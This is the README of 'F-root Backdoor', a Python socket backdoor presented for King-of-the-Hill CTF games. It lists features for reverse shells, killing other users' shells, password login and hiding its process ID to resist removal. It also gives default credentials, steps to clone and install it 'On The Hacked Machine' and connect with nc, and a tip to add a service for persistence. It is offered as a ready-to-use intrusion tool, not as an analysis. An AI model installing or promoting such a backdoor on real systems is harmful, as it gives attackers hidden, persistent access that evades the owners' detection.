![banner](https://cdn.discordapp.com/attachments/953295200200065056/1093675758922248213/Screenshot_2023-04-06_20-16-15.png)


<h1>F-root Backdoor</h1> 

> :warning: In development

### Topics

#### [Description](#description)
#### [Perks](#perks)
#### [configuration](#configuration)
#### [requisites](#requisites)

## **Description**
<p align="justify">
  A Simple Backdoor Made in Python Using Sockets I Believe It's Simple To Handle Other Than It Hides PID From Connections Making The Backdoor Better For Games Like Koth 
</p>

## Requisites
Python3 (tested on: Python 3.11.2, 3.9.9, 3.6.9)

### tested koth machines
Hackers :white_check_mark:
Food :white_check_mark:
Shrek :white_check_mark:
Fortune :white_check_mark:
Hogwarts ❌
SpaceJam ❌

if possible root in the machine
## Perks

### Revshell
The backdoor can make a Revshell for other devices Only using a command #revshell
![revshell](https://cdn.discordapp.com/attachments/953295200200065056/1093672538078453770/Screenshot_2023-04-06_20-04-06.png)
### Kill
In Game Situations (Koth) It Would Be Ideal to Create a Command to Kill Any Shell Existing on the Machine With tty Only using a command #kill
![kill](https://media.discordapp.net/attachments/953295200200065056/1093674460638351410/Screenshot_2023-04-06_20-11-44.png?width=1219&height=762)

### Login System
The backdoor has a login system so that if someone connects you will need a login and password :)
![login](https://cdn.discordapp.com/attachments/953295200200065056/1093676969167704074/Screenshot_2023-04-06_20-21-07.png)

### Hidden PID
The backdoor Hides The PID of the process that is done through the server making it difficult to remove the backdoor
![hidden](https://cdn.discordapp.com/attachments/953295200200065056/1093682587345633342/Screenshot_2023-04-06_20-44-02.png)


## Configuration
Change the passwords or the port if you want to default the port is 2222 and the login and password are `froot:detrew`

If you want to simplify things run the file install.sh (Modify the file Server.py before)

if you don't just change things in the file and it's ready to run, if you want to add an extra persistence you can add a service that will run the file

## Install 
### On The Hacked Machine
```
git clone https://github.com/Detrew/f-root-backdoor
cd f-root-backdoor
chmod +x install.sh
bash install.sh
```
### On Your Machine Connect Using nc
`nc IP PORT`

### problems or doubts my discord is Detrew#0600
